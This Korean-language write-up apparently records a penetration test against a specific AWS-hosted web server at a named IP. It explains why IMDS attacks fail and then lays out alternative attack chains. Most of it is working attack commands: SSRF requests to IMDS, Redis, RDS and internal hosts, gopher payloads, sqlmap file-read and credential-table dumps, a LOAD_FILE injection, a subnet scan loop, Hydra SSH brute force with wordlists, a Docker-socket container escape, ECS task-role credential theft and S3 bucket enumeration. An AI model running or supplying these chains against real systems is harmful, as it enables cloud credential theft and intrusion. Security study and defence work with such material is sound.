# IMDS 비활성화 시나리오 - 상세 설명

## 왜 IMDS 공격이 막히는가?

### 시나리오 1: IMDS v1 비활성화, v2만 활성화

**왜 이렇게 설정하는가?**
- AWS 보안 모범 사례: IMDS v1은 SSRF 공격에 취약하기 때문에 비활성화 권장
- IMDS v2는 세션 토큰 기반이라 SSRF로 공격하기 어려움

**왜 공격이 안 되는가?**
```bash
# v1 방식 (차단됨)
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# 응답: 401 Unauthorized

# 이유:
1. IMDS v2는 먼저 PUT 요청으로 토큰을 받아야 함
2. 대부분의 SSRF 취약점은 GET 요청만 지원
3. 설령 PUT이 가능해도 토큰을 받아서 다시 요청해야 함 (2단계 공격 필요)
```

**v2 토큰 발급 과정 (왜 어려운가?)**
```bash
# 1단계: 토큰 발급 (PUT 메소드 필요)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2단계: 토큰으로 메타데이터 요청
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# SSRF로 왜 안 되는가?
1. 취약한 PHP 코드: file_get_contents($url) → GET만 지원
2. PUT 메소드 불가능
3. 커스텀 헤더 추가 불가능
4. 응답(토큰)을 변수에 저장 후 재사용 불가능
```

**우회 시도: Gopher 프로토콜**
```bash
# Gopher로 PUT 요청 시뮬레이션
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0a
Host:%20169.254.169.254%0d%0a
X-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0a

# 왜 대부분 실패하는가?
1. PHP file_get_contents()는 gopher 프로토콜 지원 안 함 (보안상 비활성화)
2. allow_url_fopen = On이어도 gopher는 별도로 allow_url_include 필요
3. 최신 PHP 버전은 gopher 완전 제거
```

---

### 시나리오 2: IMDS 완전 비활성화

**왜 완전히 비활성화하는가?**
```bash
# EC2 설정
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-endpoint disabled

# 이유:
1. IAM Role을 사용하지 않는 애플리케이션
2. 환경변수나 Parameter Store로 자격증명 관리
3. SSRF 공격 표면 완전 제거
```

**확인 방법**
```bash
curl "http://3.35.218.180/api/health.php?url=http://169.254.169.254/latest/meta-data/"
# 응답: Connection refused

# 왜 Connection refused인가?
- IMDS 서비스가 아예 실행되지 않음
- 169.254.169.254:80 포트가 LISTEN 상태가 아님
- timeout이 아니라 즉시 거부됨
```

---

### 시나리오 3: SSRF 엔드포인트 자체가 삭제됨

**현재 상황**
```bash
curl "http://3.35.218.180/api/health.php"
# 응답: 404 Not Found

# 왜 삭제했는가?
1. health.php가 SSRF 취약점이라는 것을 개발자가 인지
2. 코드를 고치는 대신 파일 자체를 삭제 (빠른 조치)
3. 모니터링 기능을 다른 방식으로 구현
```

**백업 파일 찾기**
```bash
curl "http://3.35.218.180/api/health.php.bak"
# 응답: 200 OK (원본 코드 노출)

# 왜 백업 파일이 존재하는가?
1. 개발자가 수정 전 백업 생성
2. vi/vim 편집기가 자동으로 .swp, ~ 파일 생성
3. Git에서 체크아웃 시 .orig 파일 생성
4. 배포 스크립트가 .old 백업 생성

# 왜 백업 파일은 실행 안 되는가?
.bak, .old 확장자는 Apache에서 PHP로 실행되지 않음
→ 원본 소스코드가 그대로 다운로드됨
→ 취약한 코드 구조를 알 수 있지만 공격은 불가능
```

---

## 대체 공격이 필요한 이유

### 왜 IMDS가 막히면 다른 공격을 시도하는가?

**목표는 동일: AWS 자격증명 탈취 또는 서버 장악**

IMDS는 AWS 자격증명을 얻는 **가장 쉬운** 방법일 뿐, 유일한 방법이 아님:

1. **로컬 서비스 공격** → 데이터베이스나 캐시에서 자격증명 추출
2. **설정 파일 읽기** → `.env`, `config.php`에 하드코딩된 키 발견
3. **애플리케이션 DB 덤프** → `aws_credentials` 테이블에 저장된 키
4. **내부 네트워크 스캔** → 다른 취약한 인스턴스 찾아서 거기서 IMDS 공격
5. **컨테이너 탈출** → 호스트로 탈출 후 IMDS 접근

---

## 대체 공격 벡터 상세 설명

### 1. 로컬 서비스 공격

**왜 로컬 서비스를 공격하는가?**

IMDS가 막혔어도 서버 내부에는 다른 서비스들이 실행 중:
- MySQL (3306): 데이터베이스에 AWS 키가 저장되어 있을 수 있음
- Redis (6379): 세션 데이터에 임시 자격증명 캐싱
- Elasticsearch (9200): 로그 데이터에 키 노출

**MySQL 공격 예시**
```bash
# SSRF로 MySQL 접근
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:3306"

# 왜 이게 유용한가?
1. MySQL 응답을 보고 버전 확인 가능
2. 인증 없이 접근 가능한지 확인
3. SQL Injection과 조합하여 데이터 추출

# 실제 공격 체인
sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --sql-query "SELECT * FROM aws_credentials"

# 왜 데이터베이스에 AWS 키가 있는가?
1. 개발자가 코드에 하드코딩 대신 DB에 저장
2. 다중 서버 환경에서 자격증명 공유
3. 동적으로 자격증명 로테이션하기 위해 DB 사용
```

**Redis 공격 예시**
```bash
# SSRF로 Redis 접근
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:6379"

# 왜 Redis가 위험한가?
1. 기본 설정: 인증 없음 (requirepass 미설정)
2. 세션 스토어로 사용 → 관리자 세션 탈취 가능
3. 캐시로 사용 → 임시 AWS 자격증명 저장

# Redis 명령 실행 (Gopher 프로토콜)
gopher://127.0.0.1:6379/_KEYS%20*

# Redis에서 AWS 키 추출
KEYS aws:*
GET aws:access_key_id
GET aws:secret_access_key
```

---

### 2. 내부 네트워크 스캔

**왜 내부 네트워크를 스캔하는가?**

AWS VPC 환경 특성:
- EC2 인스턴스는 보통 172.31.0.0/16 또는 10.0.0.0/16 대역 사용
- 같은 VPC 내 다른 인스턴스나 서비스 존재
- 웹 서버는 보안이 강화되었지만 내부 서버는 취약할 수 있음

**RDS 엔드포인트 찾기**
```bash
# 왜 RDS를 찾는가?
1. 웹 서버의 DB 접속 정보를 소스코드에서 획득
2. RDS 엔드포인트는 보통 VPC 내부에서만 접근 가능
3. SSRF를 통해 내부 네트워크에서 RDS 접근 가능

# 설정 파일에서 RDS 엔드포인트 확인
curl "http://3.35.218.180/api/config.php.bak"
# DB_HOST=mydb.c9akciq32.us-east-1.rds.amazonaws.com

# SSRF로 RDS 접근
curl "http://3.35.218.180/api/health.php?url=http://mydb.c9akciq32.us-east-1.rds.amazonaws.com:3306"

# 왜 직접 RDS를 공격하는가?
1. 웹 서버보다 RDS 보안이 약할 수 있음
2. 기본 자격증명(admin/password) 사용 가능
3. 데이터베이스에 AWS 키 저장되어 있을 수 있음
```

**ElastiCache 공격**
```bash
# 왜 ElastiCache를 찾는가?
ElastiCache (Redis/Memcached)는 인증 없이 사용되는 경우가 많음

# 엔드포인트 찾기
curl "http://3.35.218.180/api/health.php?url=http://mycache.abc123.0001.use1.cache.amazonaws.com:6379"

# 데이터 추출
gopher://mycache.abc123.0001.use1.cache.amazonaws.com:6379/_KEYS%20*
```

---

### 3. 설정 파일에서 AWS 키 찾기

**왜 설정 파일에 AWS 키가 있는가?**

개발자의 나쁜 보안 관행:
```php
// config.php - 나쁜 예시
<?php
define('AWS_ACCESS_KEY', 'AKIAIOSFODNN7EXAMPLE');
define('AWS_SECRET_KEY', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
?>

// 왜 이렇게 하는가?
1. IAM Role 설정이 복잡해서 하드코딩
2. 로컬 개발 환경에서 사용하던 것을 그대로 배포
3. 보안 모범 사례를 모름
```

**SQL Injection으로 파일 읽기**
```bash
# 왜 SQL Injection을 사용하는가?
SSRF가 막혀도 SQL Injection으로 파일 시스템 접근 가능

sqlmap -u "http://3.35.218.180/login.php" \
  --data "username=admin&password=test" \
  --file-read="/var/www/html/.env"

# MySQL LOAD_FILE()
' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -

# 왜 .env 파일인가?
Laravel, Symfony 등 최신 프레임워크는 .env에 환경변수 저장
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG
```

**찾을 가능성이 높은 파일들**
```bash
/var/www/html/.env              # 프레임워크 환경변수
/var/www/html/config.php        # 커스텀 설정
/home/ec2-user/.aws/credentials # AWS CLI 자격증명
/root/.aws/credentials          # Root 사용자 자격증명
/var/www/.aws/credentials       # 웹 서버 프로세스 자격증명
/opt/app/.env                   # 애플리케이션 디렉토리

# 왜 여러 경로를 시도하는가?
1. 배포 방식에 따라 경로가 다름
2. 개발자마다 다른 위치에 저장
3. 하나라도 찾으면 성공
```

---

### 4. 애플리케이션 데이터베이스에서 AWS 키 추출

**왜 데이터베이스에 AWS 키가 있는가?**

실제 사례:
```sql
-- 다중 서버 환경에서 자격증명 공유
CREATE TABLE aws_credentials (
    id INT PRIMARY KEY,
    service VARCHAR(50),
    access_key VARCHAR(100),
    secret_key VARCHAR(200),
    created_at TIMESTAMP
);

INSERT INTO aws_credentials VALUES
(1, 's3', 'AKIAIOSFODNN7EXAMPLE', 'wJalrXUtnFEMI/...', NOW());

-- 왜 이렇게 하는가?
1. 여러 웹 서버가 동일한 AWS 자격증명 사용
2. 자격증명 로테이션을 중앙에서 관리
3. 서비스별로 다른 IAM 키 사용
```

**SQL Injection으로 추출**
```bash
# 1. 데이터베이스 목록
sqlmap --dbs

# 2. 테이블 목록
sqlmap -D webapp --tables

# 3. aws_credentials 테이블 덤프
sqlmap -D webapp -T aws_credentials --dump

# 왜 단계별로 진행하는가?
1. DB 이름을 모르기 때문에 먼저 목록 확인
2. 테이블 이름도 추측해야 함 (aws_, credentials, config 등)
3. 전체 덤프는 시간이 오래 걸리므로 타겟 테이블만
```

**AWS 키 패턴 검색**
```bash
# AWS Access Key 패턴
AKIA[0-9A-Z]{16}

# 왜 이 패턴인가?
- AKIA: AWS IAM 사용자 액세스 키 접두사
- 16자: 무작위 영숫자 대문자

# grep으로 검색
grep -r "AKIA" /var/www/html/
grep -r "aws_access_key_id" /var/www/html/

# DB 덤프 파일에서 검색
grep -E "AKIA[0-9A-Z]{16}" database_dump.sql
```

---

### 5. 다른 EC2 인스턴스로 피봇

**왜 피봇 공격이 필요한가?**

현재 웹 서버 상황:
- IMDS 비활성화
- ModSecurity 활성화
- 강력한 보안 설정

하지만 VPC 내부의 다른 인스턴스는?
- 내부 서버는 보안이 약할 수 있음
- 개발/테스트 서버는 방치되는 경우 많음
- 관리자 서버는 강력하지만 백업 서버는 취약

**내부 네트워크 스캔**
```bash
# SSRF로 내부 IP 스캔
for i in {1..254}; do
    curl -s "http://3.35.218.180/api/health.php?url=http://172.31.0.$i:22" \
      | grep -q "SSH" && echo "Found: 172.31.0.$i"
done

# 왜 포트 22 (SSH)를 찾는가?
1. SSH 서버가 있으면 리눅스 인스턴스
2. 브루트포스 공격 가능
3. 취약한 키 교환 알고리즘 악용 가능
```

**SSH 브루트포스**
```bash
# 왜 브루트포스가 가능한가?
1. 내부 네트워크는 보안 그룹이 느슨함
2. 비밀번호 정책이 약한 경우 많음
3. 기본 자격증명 (ec2-user/ec2-user) 사용

# Hydra로 SSH 브루트포스
hydra -L users.txt -P passwords.txt ssh://172.31.0.10

users.txt:
ec2-user
admin
ubuntu
root

passwords.txt:
password
123456
ec2-user
admin
```

**다른 인스턴스의 IMDS 접근**
```bash
# SSH 접속 후
ssh ec2-user@172.31.0.10

# 이 서버는 IMDS가 활성화되어 있을 수 있음
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 왜 다른 인스턴스는 IMDS가 활성화되어 있는가?
1. 오래된 인스턴스: IMDS v2 마이그레이션 안 함
2. 개발 서버: 보안 정책 미적용
3. 관리자가 하나의 서버만 강화하고 나머지 방치
```

---

### 6. 컨테이너 환경 공격

**왜 컨테이너를 공격하는가?**

Docker/ECS 환경 특성:
```bash
# 컨테이너 내부에서 실행 중인 경우
cat /proc/1/cgroup | grep docker
# 0::/docker/a1b2c3d4...

# 왜 컨테이너인지 확인하는가?
1. 컨테이너는 호스트와 다른 보안 경계
2. 컨테이너 탈출하면 호스트 장악 가능
3. 호스트에서 IMDS 접근 가능
```

**Docker 소켓 접근**
```bash
# Docker 소켓 확인
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Nov 26 10:00 /var/run/docker.sock

# 왜 이게 위험한가?
Docker 소켓 = Docker API 직접 접근 = Root 권한과 동등

# 컨테이너 탈출
docker run -v /:/host -it ubuntu chroot /host bash

# 왜 이게 작동하는가?
1. Docker 소켓 접근 가능 = 새 컨테이너 생성 가능
2. 호스트 루트(/)를 컨테이너에 마운트
3. chroot로 호스트 파일시스템 접근
4. 컨테이너에서 호스트 명령 실행
```

**ECS Task Role 자격증명**
```bash
# ECS 환경 변수 확인
env | grep AWS

# ECS_CONTAINER_METADATA_URI_V4=/v4/...
# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Task Role 자격증명
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# 왜 169.254.170.2인가?
- IMDS (169.254.169.254)와 다른 주소
- ECS 전용 메타데이터 엔드포인트
- Task Role 자격증명 제공

# 왜 IMDS 대신 이걸 사용하는가?
1. ECS는 컨테이너 단위 IAM Role 지원
2. 각 Task마다 다른 권한 부여 가능
3. IMDS 비활성화해도 Task Role은 작동
```

---

### 7. S3 버킷 직접 공격

**왜 S3 버킷을 직접 공격하는가?**

IMDS 없이도 S3 공격 가능한 이유:
```bash
# 1. 퍼블릭 버킷 (인증 불필요)
aws s3 ls s3://company-backup --no-sign-request

# 왜 --no-sign-request?
AWS 자격증명 없이 퍼블릭 버킷 접근

# 왜 퍼블릭 버킷이 존재하는가?
1. 개발자가 실수로 퍼블릭 설정
2. 정적 웹사이트 호스팅용
3. CDN과 연동하기 위해 퍼블릭 설정

# 2. ACL 잘못된 버킷
aws s3api get-bucket-acl --bucket company-backup

# AuthenticatedUsers 그룹에 권한 부여된 경우
- AWS 계정만 있으면 접근 가능
- 자격증명은 필요하지만 해당 회사 계정이 아니어도 됨
```

**버킷 이름 추측**
```bash
# 왜 버킷 이름을 추측하는가?
S3 버킷은 전역적으로 고유한 이름 사용

# 일반적인 버킷 이름 패턴
company-backup
company-logs
company-data
company-prod
company-dev
www.company.com
company.com-assets

# 버킷 존재 확인
curl -I https://company-backup.s3.amazonaws.com
# 403 Forbidden = 버킷 존재, 권한 없음
# 404 Not Found = 버킷 없음

# 왜 403과 404를 구분하는가?
403 = 버킷 존재하므로 권한 설정 공격 가능
404 = 버킷 이름 틀림, 다른 이름 시도
```

---

## 공격 우선순위 결정

### 1순위: SQL Injection으로 파일 읽기
**이유:**
- SSRF 없이도 가능
- 성공률이 높음 (ModSecurity 우회 성공)
- `/var/www/html/.env` 파일에 AWS 키 있을 확률 높음

### 2순위: 로컬 서비스 공격 (MySQL, Redis)
**이유:**
- SSRF 취약점이 아직 있다면 가능
- 데이터베이스에 AWS 키 저장되어 있을 가능성
- Redis는 인증 없는 경우가 많음

### 3순위: S3 퍼블릭 버킷 찾기
**이유:**
- AWS 자격증명 전혀 필요 없음
- 회사 이름만 알면 버킷 이름 추측 가능
- 민감 정보(백업, 로그)가 S3에 있을 확률 높음

### 4순위: 내부 네트워크 피봇
**이유:**
- 시간이 오래 걸림 (네트워크 스캔 필요)
- SSRF 취약점 필요
- 하지만 성공 시 다른 인스턴스의 IMDS 접근 가능

---

## 실패 사례와 이유

### 실패 사례 1: Gopher 프로토콜로 IMDS v2 우회 시도

**시도한 공격:**
```bash
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0a...
```

**실패 이유:**
```
1. PHP file_get_contents()는 gopher 지원 안 함
2. allow_url_fopen = On이어도 gopher는 기본적으로 비활성화
3. libcurl을 사용하는 경우에만 gopher 가능
4. 최신 PHP 7.4+는 gopher 완전 제거
```

### 실패 사례 2: SSRF로 MySQL 공격

**시도한 공격:**
```bash
curl "http://3.35.218.180/api/health.php?url=http://127.0.0.1:3306"
```

**실패 이유:**
```
1. MySQL 프로토콜은 HTTP가 아님
2. 바이너리 프로토콜이라 curl로 접근 불가
3. SSRF로 포트 열린 것만 확인 가능
4. 실제 데이터 추출은 SQL Injection 필요
```

### 실패 사례 3: Docker 소켓 접근

**시도한 공격:**
```bash
ls -la /var/run/docker.sock
# Permission denied
```

**실패 이유:**
```
1. www-data 사용자는 docker 그룹에 속하지 않음
2. 소켓 권한: srw-rw---- 1 root docker
3. root 권한이 있어야 접근 가능
4. 권한 상승(Privilege Escalation) 먼저 필요
```

---

## 정리

IMDS가 비활성화되었을 때 대체 공격 우선순위:

1. **SQL Injection → 파일 읽기** (.env, config.php)
2. **SQL Injection → DB 덤프** (aws_credentials 테이블)
3. **S3 퍼블릭 버킷** 찾기 (인증 불필요)
4. **SSRF → 내부 네트워크** 스캔 (RDS, ElastiCache)
5. **SSRF → 피봇 공격** (다른 EC2의 IMDS)
6. **컨테이너 탈출** (ECS Task Role)

각 공격의 성공 여부는:
- **서버 설정** (IMDS, ModSecurity, 파일 권한)
- **개발자 실수** (하드코딩, 퍼블릭 버킷, 약한 비밀번호)
- **네트워크 구조** (VPC 설정, 보안 그룹)

에 따라 달라집니다.
